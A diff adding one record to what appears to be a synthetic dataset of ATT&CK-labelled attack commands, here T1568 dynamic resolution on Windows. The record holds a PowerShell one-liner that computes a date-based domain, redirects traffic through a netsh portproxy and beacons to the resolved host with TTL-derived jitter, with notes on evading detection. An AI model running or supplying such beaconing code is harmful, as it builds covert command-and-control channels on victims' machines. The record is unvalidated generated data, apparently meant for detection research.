@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$dom='node'+(Get-Date -Format 'MMddyy')+'.svc.net';for($n=0;$n -lt 2;$n++){Clear-DnsClientCache;try{$a=Resolve-DnsName $dom -Type A -ErrorAction Stop;$rec=$a|Get-Random;$ip=$rec.IPAddress;$ttl=[int]$rec.TTL;netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=9091 connectaddress=$ip connectport=9091;Invoke-WebRequest -Uri 'http://127.0.0.1:9091/b' -UseBasicParsing -Headers @{TTL=$ttl;Dom=$dom} -TimeoutSec 5;Start-Sleep -Seconds ([Math]::Min(($ttl/2+ (Get-Random -Min 3 -Max 9)),45))}catch{Start-Sleep -Seconds 5}}",
+  "explanation": "Flushes DNS cache to force fresh lookups, leverages TTL to jitter beacon timing, and updates portproxy each cycle to align with dynamic resolution.",
+  "rationale_steps": [
+    "Clear DNS cache to avoid stale mappings and force re-resolution.",
+    "Use TTL-derived delays to mimic irregular traffic while tracking dynamic endpoints."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-d7965fc3",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
